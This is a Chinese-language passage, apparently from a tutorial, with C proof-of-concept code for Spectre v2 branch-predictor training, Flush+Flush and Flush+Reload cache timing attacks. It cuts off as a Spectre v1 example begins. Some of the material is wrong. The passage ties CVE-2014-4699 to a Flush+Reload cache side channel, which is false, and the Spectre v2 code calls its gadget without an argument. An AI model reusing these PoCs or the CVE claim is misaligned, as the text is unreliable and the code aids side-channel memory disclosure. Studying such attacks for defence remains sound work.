#include <stdint.h>
#include <string.h>
#include <unistd.h>

// 探测数组
unsigned char probe[256 * 4096];

// 目标gadget：读取受害者内存并影响缓存
void gadget(uint64_t victim_addr) {
    // 读取受害者内存
    volatile unsigned char data = *(volatile unsigned char*)victim_addr;
    // 访问probe[data * 4096] 以影响缓存
    volatile unsigned char tmp = probe[data * 4096];
}

// 训练BTB：使间接分支预测到gadget
void train_btb() {
    // 多次调用一个间接跳转，目标为gadget
    void (*func_ptr)() = (void (*)())gadget;
    for (int i = 0; i < 1000; i++) {
        func_ptr();
    }
}

int main() {
    // 初始化probe
    memset(probe, 0, sizeof(probe));

    // 训练BTB
    train_btb();

    // 等待受害者执行间接分支
    // 实际需要与受害者同步
    sleep(1);

    // 通过Flush+Reload检测probe数组
    // 这里省略
    printf("Spectre v2 attack prepared.\n");
    return 0;
}


受害者进程需要有一个间接分支（如函数指针调用），且攻击者能控制BTB。实际利用复杂，需要精确的时序和地址对齐。修复：操作系统使用retpoline（一种软件替代方案）避免间接分支预测；CPU微码更新引入IBRS（Indirect Branch Restricted Speculation）和STIBP（Single Thread Indirect Branch Predictors）。

Flush+Flush攻击是一种基于`clflush`指令执行时间的侧信道攻击。其原理是：`clflush`指令的执行时间依赖于目标地址是否在缓存中。如果地址在缓存中，`clflush`需要写回并失效，耗时较长；如果不在缓存中，则只需简单失效，耗时较短。攻击者通过测量`clflush`的执行时间来判断目标地址是否被受害者访问过。

与Flush+Reload不同，Flush+Flush不需要Reload步骤，而是直接利用Flush本身的时间差异。优点：不需要访问目标地址（避免触发缓存命中），更隐蔽。缺点：时间差异较小，需要高精度计时。

以下是一个Flush+Flush的POC（C语言，使用RDTSC指令）：

c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

// 目标地址（共享变量）
volatile unsigned char target = 0;

uint64_t flush_time(void *addr) {
    uint64_t start, end;
    start = __rdtsc();
    _mm_clflush(addr);
    end = __rdtsc();
    return end - start;
}

int main() {
    // 初始化target
    target = 42;

    // 第一次Flush：此时target在缓存中（可能）
    uint64_t t1 = flush_time(&target);
    printf("First flush (cache hit?): %lu cycles\n", t1);

    // 模拟受害者访问target
    volatile unsigned char tmp = target;

    // 第二次Flush：此时target在缓存中（因为刚访问）
    uint64_t t2 = flush_time(&target);
    printf("Second flush (cache hit): %lu cycles\n", t2);

    // 再次Flush：此时target不在缓存中
    uint64_t t3 = flush_time(&target);
    printf("Third flush (cache miss): %lu cycles\n", t3);

    // 通过阈值判断
    if (t2 > t3 + 50) {
        printf("Flush+Flush: victim accessed target\n");
    }
    return 0;
}


实际攻击中，攻击者需要多次测量并设置阈值。防御措施：禁用`clflush`指令（通过CR4寄存器）或使用缓存分区。

Flush+Reload是一种基于缓存的侧信道攻击，利用共享内存（如库函数）和缓存一致性协议来监控受害者对特定内存行的访问。攻击流程分为三步：1）Flush：攻击者使用`clflush`指令将目标缓存行从所有缓存层级中清除；2）等待：攻击者等待一段时间，让受害者执行；3）Reload：攻击者重新读取该内存地址，并测量访问时间。如果受害者访问过该地址，数据会被加载到缓存中，Reload时间较短；否则需要从主存读取，时间较长。通过时间差异，攻击者可以推断受害者的访问模式。

以下是一个C+内联汇编的POC，演示如何监控一个全局变量是否被访问：

c
#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>

volatile int secret = 0;  // 共享内存

void victim() {
    // 模拟受害者访问secret
    secret = 42;
}

int main() {
    uint64_t start, end, diff;
    volatile int probe;  // 防止优化

    // Flush: 清除secret的缓存行
    _mm_clflush(&secret);
    _mm_mfence();

    // 调用受害者（模拟并发）
    victim();

    // Reload: 测量访问时间
    start = __rdtsc();
    probe = secret;
    end = __rdtsc();
    diff = end - start;

    if (diff < 200) {  // 阈值取决于CPU
        printf("Victim accessed secret (cache hit, %lu cycles)\n", diff);
    } else {
        printf("Victim did NOT access secret (cache miss, %lu cycles)\n", diff);
    }
    return 0;
}


编译时需使用`-O0`避免优化。实际攻击中，攻击者需要与受害者共享内存（如动态库中的函数地址）。该技术对应CVE-2014-4699（Linux内核缓存侧信道），影响Linux内核3.x版本，漏洞成因是`flush+reload`可监控内核内存访问。修复方案：禁用超线程、使用内核页表隔离（KPTI）或缓存行填充。

Spectre v1（CVE-2017-5753）利用现代CPU的分支预测和乱序执行机制，绕过边界检查读取越界内存。原理：当条件分支（如`if (x < array1_size)`）被训练为总是预测为真时，CPU会提前执行分支内的代码，即使实际条件为假。乱序执行会访问`array1[x]`，即使`x`越界，并将结果通过缓存侧信道泄露。攻击者通过训练分支预测器，然后传入恶意索引，利用Flush+Reload检测缓存状态，逐字节读取目标内存。

以下POC演示在用户空间读取越界内存（假设`array1`和`array2`相邻）：

